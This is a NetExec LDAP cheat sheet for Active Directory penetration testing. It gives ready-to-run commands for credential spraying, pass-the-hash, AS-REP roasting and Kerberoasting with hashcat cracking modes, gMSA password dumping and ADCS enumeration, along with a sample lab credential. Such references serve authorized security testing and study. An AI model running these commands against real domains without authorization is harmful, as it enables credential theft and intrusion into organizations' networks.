## Authentication
```
LDAP Authentication
Testing if an account exists without kerberos protocol:

nxc ldap 192.168.1.0/24 -u users.txt -p '' -k

Testing credentials
nxc ldap 192.168.1.0/24 -u user -p password
nxc ldap 192.168.1.0/24 -u user -H A29F7623FD11550DEF0192DE9246F46B

Expected Results:
LDAP        192.168.255.131 5985   ROGER            [+] GOLD\user:password

Domain name resolution is expected.
By default, the ldap protocol will get the domain name by making connection to the SMB share (of the dc), if you don't want that initial connection, just add the option --no-smb
```

## ASREPRoast
```
Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required.
You can retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required if you have a list of users on the domain

Without authentication
The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt

Using a wordlist, you can find wordlists of username here
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
Set the password value to '' to perform the test without authentication

With authentication
If you have one valid credential on the domain, you can retrieve all the users and hashs where the Kerberos pre-authentication is not required.

nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

Use option kdcHost when the domain name resolution fail:
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name

Cracking with hashcat
To crack hashes on the file output.txt with hashcat use the following options:
hashcat -m18200 output.txt wordlist
```

## Find Domain SID
```
You can find the domain SID using function --get-sid.
$ nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
LDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\sqlsvc 
LDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
```

## Kerberoasting
```
Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting.
You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique.
The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.
Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.

To perfom this attack, you need an account on the domain

nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt

Cracking with hashcat
hashcat -m13100 output.txt wordlist.txt
```

## Unconstrained Delegation
```
NetExec allows you to retrieve the list of all computers and users with the flag TRUSTED_FOR_DELEGATION
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```

## Admin Count
```
adminCount Indicates that a given object has had its ACLs changed to a more secure value by the system because it was a member of one of the administrative groups (directly or transitively).

nxc ldap 192.168.255.131 -u adm -p pass --admin-count
```

## Machine Account Quota
```
This module retrieves the MachineAccountQuota domain-level attribute.
It's useful to check this value because by default it permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain.

nxc ldap <ip> -u user -p pass -M maq
```

## Get User Descriptions
```
Look for passwords inside the users description.
Three options:
FILTER: To look for a string inside the description
PASSWORDPOLICY: To look for password according to the complexity requirements of windows
MINLENGTH: Choose the minimum length of the password (may be obtained from --pass-pol)
```

## Dump gMSA
```
Extract gmsa credentials accounts
Using the protocol LDAP you can extract the password of a gMSA account if you have the right.
LDAPS is required to retrieve the password, using the --gmsa LDAPS is automatically selected
$ nxc ldap <ip> -u <user> -p <pass> --gmsa
```

## Exploit ESC8 (ADCS)
```
List All PKI Enrollment Servers
nxc ldap <ip> -u user -p pass -M adcs

List All Certificates Inside a PKI
nxc ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx
```

Helpful Resources
https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4
https://github.com/zer1t0/certi
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
























